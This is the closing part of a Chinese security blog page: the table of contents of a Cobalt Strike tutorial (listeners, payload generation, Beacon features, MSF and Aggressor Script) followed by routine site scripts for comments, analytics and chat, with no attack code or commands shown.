class="toc-text">3、启动服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5"><span class="toc-text">4、客户端连接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-text">三、参数详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Cobalt-Strike"><span class="toc-text">1、Cobalt Strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81View"><span class="toc-text">2、View</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81Attacks"><span class="toc-text">3、Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Packages"><span class="toc-text">（1）Packages</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Web-Drive-by"><span class="toc-text">（2）Web Drive-by</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81Reporting"><span class="toc-text">4、Reporting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81Help"><span class="toc-text">5、Help</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%B7%A5%E5%85%B7%E6%A0%8F"><span class="toc-text">6、工具栏</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-text">四、基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">1、创建监听器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">2、生成木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%BC%80%E5%90%AFWeb%E6%9C%8D%E5%8A%A1"><span class="toc-text">3、开启Web服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC"><span class="toc-text">4、运行木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">5、提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%AF%BC%E5%87%BA%E6%8A%A5%E5%91%8A"><span class="toc-text">6、导出报告</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81Beacon"><span class="toc-text">五、Beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81browserpivot"><span class="toc-text">1、browserpivot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81Socks%E4%BB%A3%E7%90%86"><span class="toc-text">2、Socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81powershell-import"><span class="toc-text">3、powershell-import</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E9%99%84%E5%BD%95"><span class="toc-text">六、附录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E4%B8%8EMSF%E8%81%94%E5%8A%A8"><span class="toc-text">七、与MSF联动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%9C%A8MSF%E4%B8%AD%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">1、在MSF中创建监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%9C%A8CS%E4%B8%AD%E8%AE%BE%E7%BD%AE%E6%96%B0%E7%9A%84%E7%9B%91%E5%90%AC%E5%9C%B0%E5%9D%80"><span class="toc-text">2、在CS中设置新的监听地址</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81Aggressor-Script"><span class="toc-text">八、Aggressor Script</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Sleep%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">1、Sleep环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">2、简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%EF%BC%9F"><span class="toc-text">（1）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89e"><span class="toc-text">（2）e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89help"><span class="toc-text">（3）help</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89load"><span class="toc-text">（4）load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89ls"><span class="toc-text">（5）ls</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89proff"><span class="toc-text">（6）proff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89profile"><span class="toc-text">（7）profile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%888%EF%BC%89pron"><span class="toc-text">（8）pron</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%889%EF%BC%89reload"><span class="toc-text">（9）reload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%8810%EF%BC%89troff"><span class="toc-text">（10）troff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%8811%EF%BC%89tron"><span class="toc-text">（11）tron</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%8812%EF%BC%89x"><span class="toc-text">（12）x</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%B8%A6GUI%E7%9A%84C2"><span class="toc-text">3、使用不带GUI的C2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81Sleep%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8"><span class="toc-text">4、Sleep快速入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Arrays"><span class="toc-text">（1）Arrays</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Hashs"><span class="toc-text">（2）Hashs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E9%81%8D%E5%8E%86"><span class="toc-text">（3）遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89Push"><span class="toc-text">（4）Push</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%A4%E4%BA%92%E7%A8%8B%E5%BA%8F"><span class="toc-text">（5）简单的交互程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%BD%A9%E8%89%B2%E8%BE%93%E5%87%BA"><span class="toc-text">（6）彩色输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E9%94%AE%E7%9B%98%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="toc-text">5、键盘快捷键</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E8%8F%9C%E5%8D%95%E7%BC%96%E5%86%99"><span class="toc-text">6、菜单编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">八、参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By w01ke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1280658241'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1280658241%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/img/gongan.png"/><span>赣ICP备2021004623号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+      appKey: 'nQR603PJj8t2qUQiGTSeqXrB',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: {
+          "Heybox2": "Heybox/expression_cube_bingbujiandan.png",
+          "Heybox6": "Heybox/expression_cube_doge.png",
+          "Heybox7": "Heybox/expression_cube_gandong.png",
+          "Heybox8": "Heybox/expression_cube_guai.png",
+          "Heybox9": "Heybox/expression_cube_gugu.png",
+          "Heybox10": "Heybox/expression_cube_han.png",
+          "Heybox13": "Heybox/expression_cube_huaji.png",
+          "Heybox19": "Heybox/expression_cube_kuqi.png",
+          "Heybox20": "Heybox/expression_cube_nu.png",
+          "Heybox21": "Heybox/expression_cube_penshui.png",
+          "Heybox22": "Heybox/expression_cube_qiliang.png",
+          "Heybox23": "Heybox/expression_cube_shengqi.png",
+          "Heybox28": "Heybox/expression_cube_wa.png",
+          "Heybox29": "Heybox/expression_cube_weiqu.png",
+          "Heybox38": "Heybox/expression_heyboxgirl.png",
+          "Heybox41": "Heybox/expression_heygirl_aidao.png",
+          "Heybox42": "Heybox/expression_heygirl_baipiaoguai.png",
+          "Heybox43": "Heybox/expression_heygirl_chi.png",
+          "Heybox44": "Heybox/expression_heygirl_chigua.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox47": "Heybox/expression_heygirl_haixiu.png",
+          "Heybox48": "Heybox/expression_heygirl_henaicha.png",
+          "Heybox49": "Heybox/expression_heygirl_huaji.png",
+          "Heybox50": "Heybox/expression_heygirl_jing.png",
+          "Heybox51": "Heybox/expression_heygirl_jixialai.png",
+          "Heybox52": "Heybox/expression_heygirl_kaikele.png",
+          "Heybox53": "Heybox/expression_heygirl_ku.png",
+          "Heybox54": "Heybox/expression_heygirl_kujiuruhou.png",
+          "Heybox55": "Heybox/expression_heygirl_nielian.png",
+          "Heybox56": "Heybox/expression_heygirl_qiaokaixin.png",
+          "Heybox58": "Heybox/expression_heygirl_rua.png",
+          "Heybox59": "Heybox/expression_heygirl_toukan.png",
+          "Heybox60": "Heybox/expression_heygirl_tu.png",
+          "Heybox61": "Heybox/expression_heygirl_wuyu.png",
+          "Heybox62": "Heybox/expression_heygirl_xihuan.png",
+          "Heybox63": "Heybox/expression_heygirl_yiwen.png",
+          "Heybox64": "Heybox/expression_heygirl_zhe.png",
+          "Heybox65": "Heybox/expression_heziji_1.png",
+          "Heybox66": "Heybox/expression_heziji_10.png",
+          "Heybox67": "Heybox/expression_heziji_11.png",
+          "Heybox68": "Heybox/expression_heziji_12.png",
+          "Heybox70": "Heybox/expression_heziji_14.png",
+          "Heybox71": "Heybox/expression_heziji_15.png",
+          "Heybox77": "Heybox/expression_heziji_20.png",
+          "Heybox78": "Heybox/expression_heziji_21.png",
+          "Heybox79": "Heybox/expression_heziji_22.png",
+          "Heybox80": "Heybox/expression_heziji_23.png",
+          "Heybox87": "Heybox/expression_heziji_3.png",
+          "Heybox88": "Heybox/expression_heziji_30.png",
+          "Heybox89": "Heybox/expression_heziji_31.png",
+          "HONKAI3-Daily1": "HONKAI3-Daily/1.gif",
+          "HONKAI3-Daily2": "HONKAI3-Daily/10.gif",
+          "HONKAI3-Daily3": "HONKAI3-Daily/11.gif",
+          "HONKAI3-Daily4": "HONKAI3-Daily/12.gif",
+          "HONKAI3-Daily5": "HONKAI3-Daily/13.gif",
+          "HONKAI3-Daily6": "HONKAI3-Daily/14.gif",
+          "HONKAI3-Daily7": "HONKAI3-Daily/15.gif",
+          "HONKAI3-Daily8": "HONKAI3-Daily/16.gif",
+          "HONKAI3-Daily9": "HONKAI3-Daily/2.gif",
+          "HONKAI3-Daily10": "HONKAI3-Daily/3.gif",
+          "HONKAI3-Daily11": "HONKAI3-Daily/4.gif",
+          "HONKAI3-Daily12": "HONKAI3-Daily/5.gif",
+          "HONKAI3-Daily13": "HONKAI3-Daily/6.gif",
+          "HONKAI3-Daily14": "HONKAI3-Daily/7.gif",
+          "HONKAI3-Daily15": "HONKAI3-Daily/8.gif",
+          "HONKAI3-Daily16": "HONKAI3-Daily/9.gif",
+          "HONKAI3-Star1": "HONKAI3-Star/1.gif",
+          "HONKAI3-Star2": "HONKAI3-Star/10.gif",
+          "HONKAI3-Star3": "HONKAI3-Star/11.gif",
+          "HONKAI3-Star4": "HONKAI3-Star/12.gif",
+          "HONKAI3-Star5": "HONKAI3-Star/13.gif",
+          "HONKAI3-Star6": "HONKAI3-Star/14.gif",
+          "HONKAI3-Star7": "HONKAI3-Star/15.gif",
+          "HONKAI3-Star8": "HONKAI3-Star/16.gif",
+          "HONKAI3-Star9": "HONKAI3-Star/2.gif",
+          "HONKAI3-Star10": "HONKAI3-Star/3.gif",
+          "HONKAI3-Star11": "HONKAI3-Star/4.gif",
+          "HONKAI3-Star12": "HONKAI3-Star/5.gif",
+          "HONKAI3-Star13": "HONKAI3-Star/6.gif",
+          "HONKAI3-Star14": "HONKAI3-Star/7.gif",
+          "HONKAI3-Star15": "HONKAI3-Star/8.gif",
+          "HONKAI3-Star16": "HONKAI3-Star/9.gif"
+      },
+      path: window.location.pathname,
+      placeholder: '',
+      pageSize: '',
+      lang: 'zh-CN',
+      recordIP: true,
+      emojiCDN: 'https://valinecdn.bili33.top/',
+      enableQQ: true,
+      tagMeta: ["UP","Buddy","Visitor"],
+      master: '1e45134c2d9e333e8889556513f09903',
+      friends: ['5029a42d22ca4d65e16cf3fdd9654ffe'],
+      requiredFields: ['nick','mail'],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://MynqQPDI.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+        "X-LC-Key": 'nQR603PJj8t2qUQiGTSeqXrB',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1641175681147" id="myhk" key="1641175681147" m="1"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
+    w.ChatraID = 'EqStaz8vFN6KYhHzY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
